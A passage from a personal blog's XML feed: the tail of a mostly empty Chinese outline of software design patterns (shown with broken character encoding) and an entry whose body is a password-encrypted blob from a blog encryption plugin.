href="#å››ã€å¤–è§‚æ¨¡å¼" class="headerlink" title="å››ã€å¤–è§‚æ¨¡å¼"></a>å››ã€å¤–è§‚æ¨¡å¼</h2><h2 id="äº”ã€æ¡¥æ¥æ¨¡å¼"><a href="#äº”ã€æ¡¥æ¥æ¨¡å¼" class="headerlink" title="äº”ã€æ¡¥æ¥æ¨¡å¼"></a>äº”ã€æ¡¥æ¥æ¨¡å¼</h2><h2 id="å…­ã€ç»„åˆæ¨¡å¼"><a href="#å…­ã€ç»„åˆæ¨¡å¼" class="headerlink" title="å…­ã€ç»„åˆæ¨¡å¼"></a>å…­ã€ç»„åˆæ¨¡å¼</h2><h2 id="ä¸ƒã€äº«å…ƒæ¨¡å¼"><a href="#ä¸ƒã€äº«å…ƒæ¨¡å¼" class="headerlink" title="ä¸ƒã€äº«å…ƒæ¨¡å¼"></a>ä¸ƒã€äº«å…ƒæ¨¡å¼</h2><h1 id="0x03-è¡Œä¸ºå‹æ¨¡å¼"><a href="#0x03-è¡Œä¸ºå‹æ¨¡å¼" class="headerlink" title="0x03.è¡Œä¸ºå‹æ¨¡å¼"></a>0x03.è¡Œä¸ºå‹æ¨¡å¼</h1><p>åˆ›å»ºå‹æ¨¡å¼å…³æ³¨å¯¹è±¡å¦‚ä½•è¢«åˆ›å»ºï¼Œç»“æ„å‹æ¨¡å¼å…³æ³¨å¯¹è±¡é—´çš„ç»„ç»‡ç»“æ„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜ç¼ºå°‘ä»€ä¹ˆï¼Ÿä»OOPçš„è§’åº¦æ¥çœ‹ï¼Œæˆ‘ä»¬ä¼¼ä¹è¿˜å°‘äº†ä¸€ä¸ªç±»çš„â€œæˆå‘˜å‡½æ•°â€â€”â€”å³å¯¹è±¡ä¹‹é—´çš„è¡Œä¸º</p><p>åœ¨è½¯ä»¶å·¥ç¨‹å½“ä¸­ï¼Œè¡Œä¸ºå‹æ¨¡å¼ä¸»è¦å…³æ³¨äºå¯¹è±¡ä¹‹é—´çš„äº¤æµæ¨¡å¼å¹¶è¿›è¡Œå®ç°</p><h2 id="ä¸€ã€ç­–ç•¥æ¨¡å¼"><a href="#ä¸€ã€ç­–ç•¥æ¨¡å¼" class="headerlink" title="ä¸€ã€ç­–ç•¥æ¨¡å¼"></a>ä¸€ã€ç­–ç•¥æ¨¡å¼</h2><h2 id="äºŒã€æ¨¡æ¿æ–¹æ³•"><a href="#äºŒã€æ¨¡æ¿æ–¹æ³•" class="headerlink" title="äºŒã€æ¨¡æ¿æ–¹æ³•"></a>äºŒã€æ¨¡æ¿æ–¹æ³•</h2><h2 id="ä¸‰ã€æ¨¡å¼è§‚å¯Ÿè€…æ¨¡å¼"><a href="#ä¸‰ã€æ¨¡å¼è§‚å¯Ÿè€…æ¨¡å¼" class="headerlink" title="ä¸‰ã€æ¨¡å¼è§‚å¯Ÿè€…æ¨¡å¼"></a>ä¸‰ã€æ¨¡å¼è§‚å¯Ÿè€…æ¨¡å¼</h2><h2 id="å››ã€è¿­ä»£å­æ¨¡å¼"><a href="#å››ã€è¿­ä»£å­æ¨¡å¼" class="headerlink" title="å››ã€è¿­ä»£å­æ¨¡å¼"></a>å››ã€è¿­ä»£å­æ¨¡å¼</h2><h2 id="äº”ã€è´£ä»»é“¾æ¨¡å¼"><a href="#äº”ã€è´£ä»»é“¾æ¨¡å¼" class="headerlink" title="äº”ã€è´£ä»»é“¾æ¨¡å¼"></a>äº”ã€è´£ä»»é“¾æ¨¡å¼</h2><h2 id="å…­ã€å‘½ä»¤æ¨¡å¼"><a href="#å…­ã€å‘½ä»¤æ¨¡å¼" class="headerlink" title="å…­ã€å‘½ä»¤æ¨¡å¼"></a>å…­ã€å‘½ä»¤æ¨¡å¼</h2><h2 id="ä¸ƒã€å¤‡å¿˜å½•æ¨¡å¼"><a href="#ä¸ƒã€å¤‡å¿˜å½•æ¨¡å¼" class="headerlink" title="ä¸ƒã€å¤‡å¿˜å½•æ¨¡å¼"></a>ä¸ƒã€å¤‡å¿˜å½•æ¨¡å¼</h2><h2 id="å…«ã€çŠ¶æ€æ¨¡å¼"><a href="#å…«ã€çŠ¶æ€æ¨¡å¼" class="headerlink" title="å…«ã€çŠ¶æ€æ¨¡å¼"></a>å…«ã€çŠ¶æ€æ¨¡å¼</h2><h2 id="ä¹ã€è®¿é—®è€…æ¨¡å¼"><a href="#ä¹ã€è®¿é—®è€…æ¨¡å¼" class="headerlink" title="ä¹ã€è®¿é—®è€…æ¨¡å¼"></a>ä¹ã€è®¿é—®è€…æ¨¡å¼</h2><h2 id="åã€ä¸­ä»‹è€…æ¨¡å¼"><a href="#åã€ä¸­ä»‹è€…æ¨¡å¼" class="headerlink" title="åã€ä¸­ä»‹è€…æ¨¡å¼"></a>åã€ä¸­ä»‹è€…æ¨¡å¼</h2><h2 id="åä¸€ã€è§£é‡Šå™¨æ¨¡å¼"><a href="#åä¸€ã€è§£é‡Šå™¨æ¨¡å¼" class="headerlink" title="åä¸€ã€è§£é‡Šå™¨æ¨¡å¼"></a>åä¸€ã€è§£é‡Šå™¨æ¨¡å¼</h2><h1 id="0x04-å¹¶å‘å‹æ¨¡å¼"><a href="#0x04-å¹¶å‘å‹æ¨¡å¼" class="headerlink" title="0x04.å¹¶å‘å‹æ¨¡å¼"></a>0x04.å¹¶å‘å‹æ¨¡å¼</h1><p>å¹¶å‘å‹æ¨¡å¼ä¸»è¦æ˜¯éšç€å¤šçº¿ç¨‹å¤„ç†å™¨çš„ä¸æ–­å‘å±•å£®å¤§è€Œæ–°å‡ºç°çš„ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œåœ¨è½¯ä»¶å·¥ç¨‹ä¸­ï¼Œå¹¶å‘å‹æ¨¡å¼æ˜¯ç”¨æ¥å¤„ç†å¤šçº¿ç¨‹ç¼–ç¨‹èŒƒå¼çš„ä¸€ç±»è®¾è®¡æ¨¡å¼</p><blockquote><p>to be ğŸ•ŠğŸ•ŠğŸ•Š</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;å…¶å®ğŸ‘´ä¸ä¼šå†™ä»£ç &lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="http://blog.arttnba3.cn/categories/CODE/"/>
    
    
    <category term="design pattern" scheme="http://blog.arttnba3.cn/tags/design-pattern/"/>
    
    <category term="è®¾è®¡æ¨¡å¼" scheme="http://blog.arttnba3.cn/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>ã€PIECES.0x02ã€‘Shellä¹‹å¤–çš„å¾€äº‹ï¼šæ·±æµ·æ°´æ¯ä¸é’»å¤´</title>
    <link href="http://blog.arttnba3.cn/2021/12/31/PIECES-0X02-SHELL_OUTSIDE-2-DEEP_INTO_THE_SEA/"/>
    <id>http://blog.arttnba3.cn/2021/12/31/PIECES-0X02-SHELL_OUTSIDE-2-DEEP_INTO_THE_SEA/</id>
    <published>2021-12-30T20:30:52.000Z</published>
    <updated>2022-06-26T05:15:08.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="é“¾æ¥ï¼šhttps://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw æå–ç ï¼šcth0" data-whm="è¿˜è¯·ä¸è¦åšä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„äº‹æƒ…ï¼">  <script id="hbeData" type="hbeData" data-hmacdigest="8f2adfa3f9076462f2e37e1fb9fe29e3e1daa5e25ba12776678e796eb0d96747">eef143a3a3e51e2ee0b1e9c84de8c53c9ae7d3e19167c9913280bfaa5b480ce75380276f05b1c7473d4940709ebb324e40c9d1fe866e442b3ca46ca02cb6c70e9e97d2838eb5628d78bb2946acbfa160980a0c5e6db0d178ad5f1573187aa6d210d5dce86476aa5dcf5fa41990d761ea521f041bc020f27294e221eda8d539f6155738117c3faa06feb69d1c0247232be1c10a7d8e5b28321dd148a4d6f23f5ac0ad3ddc7defee7f7d41eed4a68c69b1d633ac1b0dd71f1ca15254fb787a3154bc711dba18c803f96d7813c812d52729ded0e377788a135bc54a56f8dc29a86fafaeab9c5a005401dd6aea8005879ec7322e6fabd1b26819ccbc6b064d2764a9eb80a540ff6b34698f40ddac941d7f471d933e9849f856f935d3d1bd3dc700d88df317f02402d564bc78bc44406e5ec82d16a5d4e3115fe6594f8e7b2365950ed9eee249cb9b054d1201aa52ea0a1ed9931bf4259e5887c53730d5d2b77d59fb31ee0b95751a4d8e36abd7ae271ca5b4b3753f3e8a88a754df370ef352c66b2e281819dd6e9da6186e4531007a7b443b7b9bef0138184d4f5ed5e7fd1cd5894eee01998bebccf1a469424f55d0b637917a5cd59c3e2a30e4476cd6c0a3e807753049327a20f84b47aaf8f092c7612a5c5714d690a6be1f5f986045f3d5db0b912b6b704ba607fb6d9794a37e4c3907a0cbd0bd6ae522401e625487be20706aa54d555588ba8c44d772a44fcc816e552f69470d6dc9e93d9c215cb558e1897b34f19dcd6f89c1221657cce90f15da40d3c6522bd95e41b0d8e299cdb2dc4ff64779943148fdbfc49bfe7a8546370aaa4fbc302200f657402a870dcbe97d89c013ac8e85922d8d3198dd7fbc810edba03e05c94f1252499058a288f30fda96af678d9780359cc40dd6a01c08ae9ed9442514ef652a315949958f490830b74d6bdc664f84400a2d30808b2b81156a339b7148b8d2b5f0955aa6a6bf0629c5e5c4d064870effc9d782ebcb2ad32216aa35403144c0b968d019357f83fdb89136b1f51a4a0f9141db277bfba01d7d235c8f3b0b427aa26d3819f566669d04ff551aa4241ff70905704793e50b266699674b4754b1f98f77f2cbfc491a99c27391dc257318499b55bfad5ffa5d51a133d59a1f821e8fdb0d5d2a4974cc7a693f086f9657d1c8c10afeec425ea2aa55f1ce93696f82e31a121c6c2cff72e30423f58271553e9683000bb29d22aba4039549621e758b4938191c56d56e543d779961a103af16d6225a9b81553460699485c4e9fdcb5dff29918be9652180b347ddec07d8ffee3a0e5db06d7cd25b44973593d2285a12517700db968af9f069d0fdb90d9bdad29c0a657e5b38a6792fc09430c660014c9bb86323ec48e3da218a457cd9af64fd4a6031c612a8b97847235c1277a80b021d510aebe6717d17a0af448403d264b2e71cd3e52c62071cc82624067d59331c029474ff9e83b3b49a125910921129a0ae582d0096ba2a108a8b7e8621a66fa55129fa9fa23d87a0a53d5039c2607b7d5203015cfe32655d846a6e604b43f7365d913fe04a10d645f31cdbfbb3ae41a95b44ba7e7a8808edfc3f0a4412ebbfd69e62ca14f335a980e7c0a483d4bbf866cbec42cf9d337779c8c6a7c47ff1352c5f82ab963b7dca28aa6a64e2e3b0d9819ad6117d37469531ae919c6dc2e19679727547bf3a7a8951a42f820013e3d2eef14e8741dc39f732ba73bd7aab8ce09c9950fd9b7aa1a34a5dcabef8a7b253b3d3bd2e8bb566a58d82501d29b4aad8a5c760b1d7265b7a7041c9106d063cd8599a77be42bde1403574d5f44fd79f3e5c607b36b36802a8170125c3dc199ea2bbec3237054b4b1366eb7d3ec6a4d167b002c1c9ce911ac460e2626f56c3ba1d65ed4396daf4404c147bbe97baab08107b8786c6ab5a58e4e05b21dabc159240191f9b4d41ee66e31089762d020acd42a200cff579c6365e40ed788f5092de5c848b28e7d0968f1d23695c88f26a23de78dce3f34746c3979abdad4c24e25e12440e400fd9ec8c289b583c3f6fe6504990a48c7c9a209e400931b3e0fb63a45e6f522fd84362b70689ddd876d4213e7801aea44d8bc174244baf4570ac9f0f71fb921916c238c958e6bb5c757d8d1b6fdaff549489343ff90497dd5fa550c4bb50e1ab50811624c3fba1b2b54be48eed5ccb9bb34a1d03a0430185aee5b6e8becbf68b4d417eae59ea68b252b1f8dbe4a59906cdfa80636e021ff1852805ce0c2a5358edbd4d1ecffe29b921346037c4d41205de32203249a8dea70072e1af2583ab7e73ef4b7402af06d9f27a6d5b3f433e86bede157f7c35f6b074b75c7c2f21c088f44286e84356db22b7915670ad902f9ba4b7dea3ce59245e876bd31cfeb7ea8e0fb717a63e7171468d98788c01ae5852a1b974ebe7a769af164ee578280246e583e5d646f17da30a51baf24e6971b64c0dcada404a843c4687fbd36d5ad69e6e5e6444b5938f7d913184f7f4914d52f02d09c0bf852589dda105f4c5f1600466bd151f20ed413506dc6afd6593e8ca8fcd6219267dac889faed7b0454fb5d15046a6fcdf2169db4242ff0355ffe2ad504e10d30cf4b8084d74dfb4165a4aeebd6a6fc4397792a3846a38aa7e7d5935321cc438b435ae2b8febedb238b7f227943c2b1c50ec029f51ed34ef488b930a0f2bba4e5eda82ff87efc6f5e673fc7972a15225befdfb5ce0489b374d4538eed4ef80f20d190d0fb5582beeb12e01d365ad7d479a21cd7760231f6055266ef7c4140cb881bd30e8ea9f058124dc4e0cf9dfd234a2fb48a68e2b9d7d439854cc09a9ee720e7208c36351356acebd9e03ba8b50e0d7f5fcbd1f19bb66f5c22aa702155d5b2cd901d9e3909984189372f236b69413b7d0d5e9490323fe0c05db57a01a266d81123b86f3ec3443e0c043b04043aea0c0c017ee7b249d8b9b33544b382dc079e0f117a3473fb020f1c0781e5baf177e64dfb6f2451e54072b966fed655f9831f25f25c47cccc118d0bbdf58297334ef5def36a5a3e630c0ca5b54584e4d400d9a94ce79ab30d2aeaa7a34068b89dc9e085b453320d7bfc17b3549075b9352a7793b1ffe2debd8789f75dcc83ceae8431497612ea1a65750a49aca209c4ad3c2d1c4003b086be5d1e5f0da44f586a68b87ac7fe9b0a3e9cfc388a1f1ad4a09036376fa362d78f8b3cb2c04d7979c36a55c357887fe62b3a37765da428f10524438683387801709d8e219f8fff9c9602fe49e0d221b59e9f2a0a3bb7f32d2e081d2bdb6496986eb2cd1573f748b1db209e0d2a1c3737bbd26f6abcb37c2cc8a29bd18246a6e8ece4175989cd8a831773c14acf1732ad0d009bb22d40782a11bc6df7cfbe105a40e81374f0856137188e4478bd0d10ec6bd528938cc3109b11308ea351a77afd2659a345ab4d9390f0d8cea05896c972f7c768749e4a4db0b16ca28e74166d7dddc3b7f6bdd72550d72bed0e357c8f133d8b25464ad5d345fba6ccc359dbca06144d3e43a9534c60840d719d8ad0ae94675b366654cb209c2e71498291bb6f44a5d1e26e2fa7c487f9250927cb604661ab45283620e192c933a7c1bf8a3e5fab3d03ac482e0b5db9032c849a76b600df969175e9ba041ed33ad39d68b02ffbe3e36f3aea67360ca47fc6e7e82dea15dc7468051c446563cf0dbe7ed8ca473c72d4ed78834881c41ba18f5148697b69682ee2ef14efd757df1b38231a7677cec2141efc295a2117b1b219133a493468bfc3b9c7e4589bb33fce88d9f1bcb9cf606e55b0404ac78e96f86e5363891e0f089400f54b03606525b09bca4d3d7c6e5f1009cc14d85739ec2e3f4f97200f59a67e50af2b9435103b31ff67c4cdb1240433ba26bd04e2d683c3278d0856c1bd743c2678a450ee7aaae11e02aeb9188c531ba293b1f52df426ff20a09e9cddab019827864b56dbad5e114c433c167ee9e3577243be41adad41d315536c08088d34bbdfa5621f5339e027771a1dd9b59f40b469fb83d76e4edd82d4efd5103985f246d856ecd65e24240066b62d2b2a44ef19aa9612fe0c833a831d5474f15775b002daa64507b081f86e6851e1476c50dc6595a2f1a32e548b0e1562df91d572e89e0228f255e61b3569d7f3c126bedfef5f2e66941711a581a80f58d2c1dc7183e071879970b059315295b7a8a3b1a570f809f8c89ee28853125ba8eabff1188dc7e46b82f8a20a82e7860055862564a0fb7392a706d10c4a2bf5ea64e8f92d5338403d00f1a21917d85c214c5eff3aa1411f8618b2ad0ac071fe8109516dfb661f23bb73c36eb39ea0bf6a30792f49e537bcb498d1ec213ac35294775088b08cb3ae6bf80529c4fbfbbc510c4c2f787ab22e943816cd2f5dab0eb9f85e0eb78e394d83711268a54921eb291eb73b5c8e0cbaedf84e450a22167654d80c92679a7627ce78c733c50ec3d34163e3afba3de3c2e17a0fe2eb47616b7a8bae105724908d427a0f069e425a1e48d55f6d2d46c7fe6bea0fed6e3cb7c3ddf30a9880c53a99e3f29ab62a6a6461460c0869abdc9ce734e625903c755d45f176f30ac53182d59a2312874e807ee85d705627a09208ce1536e01fd03c1932d9acf281e72e5c526424037b07168fd9d518b88c1e0a6208c3511fd30dcf711e01443e5afc588d6d4b656d0ee97e27e25655ae2d07297e47642e39b7a54b802b246043d3c698e8cbef3b6e7ab57831e28cf7ded560b7cb3587ba70639bbd3e256c71a59abca99483094ef2ccd49e2e90f7fbca99d896f85641621a89cd36bbb8c280eace4b1351cd461dc2be1124cbe0bd362907da894a7aaa135d8b5d1dbb4135c98e30fee97818217a3003f1c41d1c7afe0b7ece5b034007cab5919917f43e948d42e886afd0a45163774b0b8b621f500306e808769165823e4ec85ffc3a6eab3a50973b2671ab81d2169dc702bba16e9b1318ade868c2661524e74ad9c27053aa789a7b8bb3dc1d255bbaeba321b60d15453de12f565aa349c1697158f8b15cb387d741d861de81bf45b2687de4819294d7a54565a55f04441b046ab7ab606fd8af7614285ea79dafbee43afe691041aad2a089cf436cc1c5ad6d4d9280343a718bfdb1d14a5e1ae7a5366b39219ebeaf80cdacd00fb9646d9550c62400bac48d3d22f5a52a520337cc231396c6894dc48f303e99fa377789985070ad806cb49171e2d494697482a2dc89e1f4fe125511f4a238516fa151d0cdf6bb4d8ac204385a3033ae3a08e70add2ed6ce787781f57e37fe451f1ef39648b97c05d6bc58d2edb0dd8678096f94306e9d1012d3fcb9fad7c1261069068f9db122f2e142f7b9fa9e7aad5cb2fe567d46a13ebd30f32ff0f30a7d5765c9dab82029d5a4eff3bbcf181f822a72094ee119ad479758841d2025859ca73c4131c056edc85b78cf3a826e7f82622aa20da04b0c873d92b337c47efcf6be790e17d4fe5e091b60c25d4bb46c4f36a42d4de0a4eff22b015a0dd656d679878ffae882db29c532b5f38c839872852dc6b88274f7eb30e1e0585b5411131fe993ec18c0ee837d7512df17363a77be149e88240844e5c3366dc7f18478141f675c0ea87352052973bde9bf663656ecb4d2a839ba6f987decdb4493ab7edc87ce12899007af442d83b27e20dc42a83c1202e51df691745b6169a3714453117a95bfab87ad23bb900bce0a090561486a53eacbd9ca6bc37b057fb6945b61ba64108dc1b9ac317e9fd6c120a755133337fa6c79244f1cf49c959df938d5bd099b14f9173324a70cc3dd94d646fe74b242924991231b3420566e8b7b111ce29c62ca655a593360da8716f016ebd8d8d86ca5effa52a1634aab9d9d15d0632c4c39c3c3a4236bded967a4009e83539a77c58019aa25849b5b540352c622485afc8a6bb238828388bbccf30a10051946ac1a86078d28947458b621053012e92fd06abf8fd231632e9f0e7294735ed30abd0cde69ae07e2fcd869d2ab1cb270c4fe65848187938064f3c6f0a26c67e2b0b4175e9967eb07fb189107a44a9af849d9bb6eaa5a7621024964c2c0001a51fcfe24709a19596fe8bd57eeb392ef04d6c9c6b29698dc28498f02b138be9dbc094dd139b4549b74edc3d8b987e73edc677c12a51fdbbcc205bab6740de646afb3fabcc97e10e15b258b1b34452e0c821c854f5424101fc440fc6d229a9d3f14a480f0fa0bec8f7648f08d186bd7e24389a0424e18e713d31d062f4357df8a56084987c6c2bf2891f3e5ede4ad50093d64880963bb82d341e9c5dca06554dd78e1c3857f0084933482345dbdc91bce6f08b977bd0569a7124ec2771dbbf852cdff79c32c1930f56410f4dd5135da92e1947b356d4afa0d2241bca9c6e6dbe94aba42ab621fe5b324f1e8fe9825c028186562ded8a255208a192a0568dae8999bc65ae82e9c6cf3b5e43054526f11b6415eb15588e9495042aa3246e8c756baba5db675d2dae96604be3b7be8fb5fe7d3e87bfae4a143ebf2227dc1c8904752dbd7a5c3d3ace25a6a0753f192c32cdf4b38df560fbb14611d71c277fd3c565b3c3c83179f215e0bcced9d6eed0dd61e5eddc45fe238c2c4ff568b2a01a376d07dde93dbfdacdb4f8c0894a89a1f701720ccbe09fd1a36d3bba59c532b77e48e54eee097de0a5365977c98ef0782739b0aaacb6345256ee00fab04920265f6fbc528d80710158abae5a918d835d0ec480925f4d678f7a4b0ead5402ff14a11e7235893f593997de30e343611e63a2c194958cd61c3b41eead0d77fbfd48cf44615711694f816264d2e7133270d8669ce43032b844e0903ed09bc9cff0d96a48f70780d428e473188f247485654a6f1c7faac12810f8ba3c73bf385b829c32517ff447f9db9cbd9df5946386a38fca6578a818839893d6ec25c277702859e7c0e9bad185c79c6042e9c19b9190ac2d3eb8ad8d3e1c4770ed0f6281bbc1791750039303a2437a84eb15a866f58f3a47ad4245746dbe1f30f8acdb727ede8e1813f563d1bf63f568e9f3165c83635f38f70d78a0dcf883b653b318efa0c538a34aa767b2ce462a43e908a42e984bd14dc51474cf47d4bc310368f42c2bf8e0eb3977d97a0214620e6d80bf1651100be0380d4ef48685a2656cd1309fbfdfeadd3ed9602a6c1beef7c9ecd3c7045d4551d3b464a2e85e14f62ec84e6155e2a5eab4a4dae27c1091d1592005d5da8988cbc4953182b3ab92c5cbef11fef24070e0bfbf41aa4130017f00340ddce379765f1fc4deb67d7d4ddd4697b2e0829e52d22eeb44939212ee6144293e442fdbcec0e072673d48e31b7e9690f875ce9a739c10cbc629aa4a885f9e5ba4b9a2deea46c341e2cbe17f749f82c0b253b614b735d5f496c350a0fa7086eae4df9307be6c503028f1c772bf44e9bf0cec7b89e988550a9c7156ec136c5f770f5259634fdd5ac9c1038ee9655e4b1f9f85b9f04156f077818d848fb459b828dd732d22cf46cbcc3c82b9ee233dc01e880a3f91ff9691b7864832d2017991290c35f4c0205c10e1b51a8135dcb845416bf16bb1aecc8bdb8aaaa24b35cf7b8529a9729a71ca3dcd82f5f79a65fc54c4529164dc7e03f5def192722a991e77060f07566ed2d27497b63041618862493772d02aff20c5ad2016ddf70384bfbab7192adfb2e87365a0cd467f0a4e5c93ec87230765d10caaa5292d398d913eb5b1e71575843ba98c5f530b136581e4206c907ea535492286297a89c7baf21b1456adf423092f2e5ce4fb23158a638c58fd4117cde61011f52a77ff97a148dad32c4353f6dfc7f8fa278bbce72307d0c97a98b2a89a2c276b1d7dbf8ae9a673ae1bb48d1e861ece7f3cb83726ebd9f72b0dd3e75f77faa9aa3eebab4471811e1cd253a718b29a76e4a37580ca413c8a400dc447a2f953bf18f57163163576d801b1cd84654fa276fd485b2a838d6cf2653790ea91a3dfc2a72dac3c5c38e05d4feb7e2b413847aa934411f72502fef3e0626c5ca4e69ef16dd36fe9286c238e13e7f515a8f1aec0967368687b8fe206d1335f6122e0c41844a9569a1b192ee91f8a2b7d9fef472c89321baa951a365686155cf2aa7fe21fb441793fdc50c338c8a4eb72e6d51f1346e80a05fcd6a674f603d4b6c66d17c58bc7c8d013fb2f0d286cb95433e968302b230b63ab84c19d12db5d514ac858429ad1416b86a4877fca924d05cf91e47a471c6065a03697210f7862bf3ec9e96632e08f5df27e0aa491ada5196a9a94f808205c2a14e47f8f2f59b75695cc7c7b786b49d2c0d35cf5daa2733cbf5e838e7db3792fd86d3a5a2fd2c7b49669a1d71112b5e8b8b62a4338dbc503ebdde4f43664bd47714f686f5c3810c29332c46dbd620d91bd56416da62134571c69dba48be586be56131bcc23ae49f2dfcf6005a3a559dc330334dbca12bd862622954d1fb9ef07972fccd39f57f6a2a58549b116b534998c288931a6f204dce2aca84627c212845a4493ccd8695101bc01c0d4fd9fa3d29f5988c249a78738db1e60c9855bfb960612cff69c14a34d8e4a8f046aadb63a5feb08d1be7e2134bcc9749bc4d4262f6d2123e9b2c6c9044e46115875a6a79d5af6f61b8f49f3cb9978bc09e9c1c3f49d9562a620a128f56c623881fd9e07ba9e20c70b528948a3a9f00123d873658e52d1658bb7ee3d8b14723de60d0cecd438f7d208a7d29f5e38d9c5fdce6c0a02c6f9f9eb2346f630d02a0716eb129fd31d03397a3e071bb48370c388bf10aed51184bd704b1de2d9378b49965f237ec5a28d114be83430519e40b618ca3f927c891f692bb96b11a037ffd328aa25960629615e3ff47f269ca0ed12105cd88052a1728f212afc1851ff4ce657da9c29fa5983a840d9cb72060a2f45bcb7ff783077a3eb5e29213916140ef0ff15cb6433f6abf4e58caa59c9731fa2b57a4c04029d3317929d5891cdf5e1b4f77dcde29a9e0e424580f83a613daebd6c7ba04ff48d77cb0379838dd89cddf67228d7e24d4a6f2df4c22491e55233f327cc29cd6453dad808970e6b5948f125f9b360cae921429c44daeec3f76538f864a5fbde92467d7dc3cd9747d66014e2997f1bc95511489e51dc6be17d22b454de353da0b46bddd88b421f6a14a56840be6e626c3eff1afd610e4eb4ee2a2aac578cbd97467dd87ed53e19610d07ada0552e0a07deb04accc007ce4fb41f88eff75508b7c858d19ed6728ba0791aab16b37c9ab54fa44801204a42e2cd3e9364b9cc9b6b33c2ab83093f39955def4b5dd4ccf05417bc8d440bd6df2f9cdcebc85ce462cfa6e0e567c7939d6833fba839f9108aaefcaa10d31bd19a609251d0133bb9f910b399838504df8fe51bae6346c8a4f827797fdc47dd649f5b145b180a183f120303fe8f51c4f04146280042561be5f4bd4f769e32322b7d45ec8ae6851cdb230a2378255d2e9c50adebbea4bf12097f6b9ec821b907155d934aa711fb6adfa9bc552549126716899de9727d2e2adde3f62c7a1774e60028fc355fab2dff76161a032f96fc4a4a8668c341c098681b1e47d11bae31b57b20e44cd6e32a9d18f4df7b7c9a1d69f33211b7578a75147ac4aa11df004ef861739208e67a700bffe8e141e50f70f6ed61d016b43e0baefdd34bf19bdac19e4feb61755a9b3c5f2420712c57978d366b0ba8b9c01ea7f32ca31c1d5f08781eb0a7a08772e54eac7e12874e564d698ed3144d38809e68755928a424c8a4ebd7a84eacc7dccb35b25415159d79c7f0a65861caf989e27118a87bf12b989e1e4644f98a85999488fdee0dfd916044a2d704ddcd24a777bdbc2ac1d6b314e682a5ec7933f3f128841c39a09fa546140c4d9b09bcb662672bd497ff14976db9e57ba200c08a440f1a8ba233277183c423de7d945ca5babe581d99975ede33a1b4450ee8dcd8a65d7256b1cf931f8bd8baf6ae580ef9a3426beb5c0188e615288a480d58ad8d90bb4fd6d56efd8877cd60383d97b733f2a4feb8373e9f72fbc464fad92cc11f0e9596d3a1a633b3b686bb29b684748fde9ef333e92dbd911d33649f11a96e6c2bead37770b0e89b61b8462bf44a2fec9665c24ab085e0907946a21811d179132027937bc479f8b9d806729b3e4dd18b4371d0405b18c4d683a14bcebbc9d6a51d6a68ba6e4d108d403eaad1dfab731af690bce142da4259497fd7e850b28be3c6b020b8be24e7c8fd055435bdd87d7d2c507d538680a1a6d9fc9049e37f73f4ee450b4f1570446a98589dcbf4c7f7427c27f8ed90380d50487a3bf05330bf0f717f8c52d82298e74e6f266d81765ef6d407da63e0887a9c59c31c4f5746bd4261e0c689f7df8c335de4665dc28cdf3a616b2bc52e7b43850196290ce4e8388c550cac0b300a22dd3d8172511ed91edf402ae4ae5f83351879918a69d82065a47a2f5a848691bbd499662625223b1f10829387a9ccd56b494e687f8c4e9011ecca6b93b82a08dac2ed534bf13cac3eb259a146d4e6d29fccd7793f80e2129698e5fb9243115b6d28d36febe5ee990090d05711f364e0c944da1027d5cc5c5235bf84b5273a54bbc737f20a8d8979d44da443cd05b1e0d9593ef659efe3bf31b139f4fc0c3911d9f63ade5828e0fb2977cb0883a999a2b7e0aadd0fb04ac567dc0fd55e2803399249f04cedccc2ed9f58d33d73435a667618bc90127eb52c176375cf54489a8bf58211b3b6acc8a254937ef1853f1dea9cb131f47a47f03de05a0ceb81a002c285fd2350f28ef2fb56a4d7505d68e3152a47030be0811ec713799df5be6b06107eb1430a3d365d9a32f376415880faa48dc9edcc86339372b657f11ac5706ed2dec2a7d11f1d8ae6e00275ca64a53dbc7fbaa8f6c53508fd34cb19e3afd9834737989d0ed27551918a2d1640b6e4a217d2523fe79f0dcd690aba451bf9cdb5645f739a3f67c73ff23ed58b641a12d9ccc1b852cbb25bb4f6d19bf1bdf885a075f13bae249985ca41876138112096833190acd06cd9024efca02c41609507ee153ac500da76416b50caf89d7eea2a4b67953bf2f4e18181a01b95fac9172049ab184ce62a1981da2b05dcd5f386a18415aa9828dfb768e763441fa8e4706939fa31161c0c6d84d657f30abf5ef15bab4542d332522f50fbdf87d4186a6c0c24342fa5407b7dfe9f076eed17c8893b559f4528a860d0ef8161e509e081091be35b132cb6aeeb15a5be5a7c83c7a7bf142b79f3ae5885779f89316dea4956f337860aec674964d4500c57285b38a9e1973bb5d24ad61e10fc8ed60b3138989ba296a62bfcdb949c8fd67a2ab90e1ba9348a9d15f43c9bfbffd340cb307b005bcdf69f217551690ab426b9e13b4ce582bce3da73824833c16fb8e6aadf00f2dd57c563d7688edbaa36e1ddd6e73b893d7b2a721e35a8a82e477dbba7ad0db9854d6bc4867740053eba14664d0100f1b93f0ede7bf80ff947574c07c4f63c7d3d66bd38ea778cf36c2d0793ad05994de2d698541c1b26af7bf414ae7326e77506f6adf0c3b4234bc390a70c81a4d42eefc86eb6df2947235ec2fdece7604f007321fa4bdd93d0b277ee04ef4b3a33b921dcf7926f5e44d13f86710d0394ebc92ed02aefb6375461b6c4d1bc7bd96907ce3cce48b39de484db8a003f65e7c4b18827a293f77fe327348cc0f9bf93ffb004dda6f3096d392047c6c258ea1e33940654618049cc25c2963446cad5a17796b0681dcc6c8ab39c3a2b743290c25f3d773f4a06d265157709045b5357b4009568103b0284f9b440864232e251e9b4ac74a26b3702d72114c25757fd69f68410f41c65a3cf4627b2dfb08be90a6112d432eab8e8a606e65afea5fa5b89f760348fb4f5122ae875d45db1b1566c384cfa075612720d6bc4b0d06023053599a79a465f3c79cb74ff2df5100df1f50c06a516fbcba184a713960df128e163ac01bd34d9bddc0a07c01a6ad0443b53cece7c91a8b80f22aa0f929ca143a47b2a00f423bfce29d69b412ec0116410bdb146bbb961ccc86699f0647712f34cc99d24325a37a984717f8991072b6e1d18b0e6442e1f9161a1fa70044fde467145947f5d7d9f0b3db72d658dec550e5875e9386932a6a5e584812705ba5a34f7b1837cdd73fefcc5ac9813ea47d99a7369b593873c2932f8168e5973ac3214de0b3591b